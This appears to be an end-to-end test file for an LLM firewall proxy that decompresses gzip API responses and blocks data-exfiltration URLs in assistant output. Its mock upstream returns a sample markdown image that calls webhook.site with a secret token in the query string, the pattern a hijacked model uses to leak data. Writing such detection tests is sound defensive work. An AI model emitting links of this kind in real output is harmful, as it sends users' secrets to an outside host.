import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest'
import https from 'node:https'
import net from 'node:net'
import tls from 'node:tls'
import zlib from 'node:zlib'
import fs from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import forge from 'node-forge'
import { ProxyServer } from '../../src/proxy/proxy.js'
import { EventBus } from '../../src/dashboard/eventBus.js'
import { DEFAULT_CONFIG } from '../../src/config/config.js'
import { UpstreamResolver } from '../../src/proxy/upstream.js'
import { CertFactory } from '../../src/proxy/certs.js'
import type { BlockEvent } from '../../src/types.js'

vi.spyOn(UpstreamResolver.prototype, 'resolve').mockResolvedValue('127.0.0.1')

function selfSignedCert() {
  const keys = forge.pki.rsa.generateKeyPair(2048)
  const cert = forge.pki.createCertificate()
  cert.publicKey = keys.publicKey
  cert.serialNumber = '01'
  cert.validity.notBefore = new Date()
  cert.validity.notAfter = new Date()
  cert.validity.notAfter.setFullYear(cert.validity.notBefore.getFullYear() + 1)
  const attrs = [{ name: 'commonName', value: 'api.anthropic.com' }]
  cert.setSubject(attrs); cert.setIssuer(attrs); cert.sign(keys.privateKey)
  return { key: forge.pki.privateKeyToPem(keys.privateKey), cert: forge.pki.certificateToPem(cert) }
}

function dechunk(body: string): string {
  let out = '', pos = 0
  while (pos < body.length) {
    const sep = body.indexOf('\r\n', pos)
    if (sep === -1) break
    const size = parseInt(body.slice(pos, sep).trim(), 16)
    if (isNaN(size) || size === 0) break
    out += body.slice(sep + 2, sep + 2 + size)
    pos = sep + 2 + size + 2
  }
  return out
}

async function sendProxyRequest(proxyPort: number, host: string, port: number, body: string): Promise<{ statusCode: number; headers: Record<string, string>; body: string }> {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ host: '127.0.0.1', port: proxyPort }, () => {
      socket.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\n\r\n`)
    })
    let buf = ''
    socket.on('error', reject)
    socket.on('data', function onConnect(c: Buffer) {
      buf += c.toString('binary')
      if (buf.indexOf('\r\n\r\n') === -1) return
      socket.removeListener('data', onConnect)
      const tlsSocket = tls.connect({ socket, servername: host, rejectUnauthorized: false }, () => {
        tlsSocket.write(`POST /v1/messages HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n`)
        tlsSocket.write(body)
      })
      let res = ''
      tlsSocket.on('data', (d) => { res += d.toString('binary') })
      tlsSocket.on('end', () => {
        const sep = res.indexOf('\r\n\r\n')
        const lines = res.slice(0, sep).split('\r\n')
        const statusCode = parseInt((lines[0] ?? '').split(' ')[1] ?? '0', 10)
        const headers: Record<string, string> = {}
        for (const l of lines.slice(1)) { const ci = l.indexOf(': '); if (ci > 0) headers[l.slice(0, ci).toLowerCase()] = l.slice(ci + 2) }
        let b = res.slice(sep + 4)
        if (headers['transfer-encoding'] === 'chunked') b = dechunk(b)
        resolve({ statusCode, headers, body: b })
      })
      tlsSocket.on('error', reject)
    })
  })
}

describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 20000 }, () => {
  let tempDir: string
  let mockUpstream: https.Server
  let upstreamPort: number
  let proxy: ProxyServer
  let eventBus: EventBus
  const events: BlockEvent[] = []

  // Block mode so we can assert neutralization of the exfil URL.
  const testConfig = {
    ...DEFAULT_CONFIG,
    proxy: { ...DEFAULT_CONFIG.proxy, port: 18094 },
    dashboard: { ...DEFAULT_CONFIG.dashboard, port: 17794 },
    dlp: { ...DEFAULT_CONFIG.dlp, enabled: false },
    dos: { ...DEFAULT_CONFIG.dos, enabled: false },
    responseScan: { enabled: true, mode: 'block' as const },
  }

  // gzip a JSON body whose assistant text carries a given (visible) markdown image.
  function gzipBody(text: string): Buffer {
    return zlib.gzipSync(Buffer.from(JSON.stringify({
      id: 'msg_1', type: 'message', role: 'assistant',
      content: [{ type: 'text', text }],
    })))
  }

  beforeAll(async () => {
    tempDir = fs.mkdtempSync(join(tmpdir(), 'llm-fw-respscan-e2e-'))
    process.env.LLM_FW_DIR = tempDir
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'

    mockUpstream = https.createServer(selfSignedCert(), (req, res) => {
      let body = ''
      req.on('data', (c) => { body += c })
      req.on('end', () => {
        const scenario = (() => { try { return (JSON.parse(body) as { scenario?: string }).scenario ?? 'exfil' } catch { return 'exfil' } })()
        const text = scenario === 'clean'
          ? 'Here is your answer: the revenue rose 12%.'
          : 'Here is the chart ![chart](https://webhook.site/abc-123?d=secret-token)'
        res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Encoding': 'gzip' })
        res.end(gzipBody(text))
      })
    })
    await new Promise<void>((r) => mockUpstream.listen(0, '127.0.0.1', () => r()))
    upstreamPort = (mockUpstream.address() as net.AddressInfo).port

    eventBus = new EventBus(testConfig.dashboard)
    vi.spyOn(eventBus, 'emit').mockImplementation((e) => { events.push(e as BlockEvent) }) // capture; ring buffer not needed in test
    proxy = new ProxyServer(testConfig, eventBus)
    new CertFactory().generateCA()
    await proxy.init()
    proxy.start()
  })

  afterAll(async () => {
    await proxy.stop()
    mockUpstream.close()
    if (tempDir && fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true })
  })

  it('decompresses a gzip response and blocks a markdown-image exfil URL', async () => {
    events.length = 0
    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'exfil', messages: [{ role: 'user', content: 'make a chart' }] }))

    expect(res.statusCode).toBe(200)
    // Feature 2: client receives DECOMPRESSED JSON, not gzip bytes, and the
    // content-encoding header is stripped.
    expect(res.headers['content-encoding']).toBeUndefined()
    const json = JSON.parse(res.body) as { content: { text: string }[] }
    // Feature 3: the exfil URL was neutralized in the forwarded body.
    expect(res.body).not.toContain('webhook.site')
    expect(json.content[0]!.text).toContain('llm-fw-blocked-exfil-url')
    // An event was emitted for the exfil finding.
    const exfil = events.find(e => e.kind === 'response-exfil')
    expect(exfil).toBeDefined()
    expect(exfil!.action).toBe('blocked')
    expect(exfil!.exfilUrl).toContain('webhook.site')
  })

  it('decompresses a clean gzip response untouched (no exfil event)', async () => {
    events.length = 0
    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'clean', messages: [{ role: 'user', content: 'hi' }] }))

    expect(res.statusCode).toBe(200)
    expect(res.headers['content-encoding']).toBeUndefined()
    const json = JSON.parse(res.body) as { content: { text: string }[] }
    expect(json.content[0]!.text).toContain('revenue rose 12%')
    expect(events.some(e => e.kind === 'response-exfil')).toBe(false)
  })
})
